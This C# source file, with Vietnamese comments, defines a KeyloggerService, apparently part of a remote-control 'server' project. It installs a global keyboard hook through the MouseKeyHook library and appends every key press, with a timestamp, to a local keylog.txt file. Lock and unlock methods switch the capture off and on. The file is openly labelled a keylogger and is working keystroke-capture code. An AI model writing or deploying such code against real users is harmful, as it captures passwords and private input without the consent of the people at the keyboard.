using Gma.System.MouseKeyHook;

namespace SERVER_22810201
{
    /// <summary>
    /// Dịch vụ Keylogger để ghi lại các phím nhấn.
    /// </summary>
    public class KeyloggerService : IKeyloggerService
    {
        private readonly string _logFilePath;
        private readonly IKeyboardMouseEvents _globalHook;

        public KeyloggerService()
        {
            _logFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "keylog.txt");
            _globalHook = Hook.GlobalEvents();
            _globalHook.KeyDown += OnKeyDown;
            LockKeyboard();
        }

        /// <summary>
        /// Phương thức gọi khi có phím được nhấn.
        /// </summary>
        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            // Ghi lại phím nhấn vào tệp
            using StreamWriter sw = File.AppendText(_logFilePath);
            sw.WriteLine($"Phím: {e.KeyCode} lúc {DateTime.UtcNow.AddHours(7)}");
        }

        public ResponseObject LockKeyboard()
        {
            try
            {
                _globalHook.KeyDown -= OnKeyDown;
                return new ResponseObject
                    (true, $"Khóa keylogger thành công!");
            }
            catch (Exception ex)
            {
                return new ResponseObject
                    (false, $"Lỗi khi khóa keylogger: {ex.Message}");
            }
        }
        public ResponseObject UnlockKeyboard()
        {
            try
            {
                _globalHook.KeyDown += OnKeyDown;
                return new ResponseObject
                    (true, $"Mở khóa keylogger thành công!");
            }
            catch (Exception ex)
            {
                return new ResponseObject
                    (false, $"Lỗi khi mở khóa keylogger: {ex.Message}");
            }
        }
    }
}
